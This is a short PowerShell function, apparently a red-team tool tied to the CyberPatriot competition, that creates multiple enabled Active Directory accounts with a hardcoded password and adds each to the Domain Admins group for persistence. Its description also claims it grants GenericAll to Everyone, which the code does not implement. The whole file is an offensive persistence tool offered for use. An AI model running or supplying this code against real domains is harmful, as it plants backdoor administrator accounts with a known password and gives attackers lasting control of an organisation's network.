function Add-PersistDomainAdmins {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true)]
        [string]$Users
    )
    <#
    .SYNOPSIS
    Uses the Powershell Active Directory module's New-ADUser and Add-ADGroupMember to create multiple extraneous Domain Admins.
    Function: Add-PersistDomainAdmins
    Author: Altoid0, Twitter: @Altoid0day
    Version: 1.0
    .DESCRIPTION
    Just spam the DC with extra Domain Admins and configure GenericAll for EVERYONE for persistence
    .EXAMPLE
    PS C:\> Add-PersistDomainAdmins -Users a,b,c,d,e,f,g
    #>
    
    #TODO split by comma

    foreach ($User in $Users) {
        New-ADUser $User -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force)
        Add-ADGroupMember -Identity "Domain Admins" -Members $User
    }
}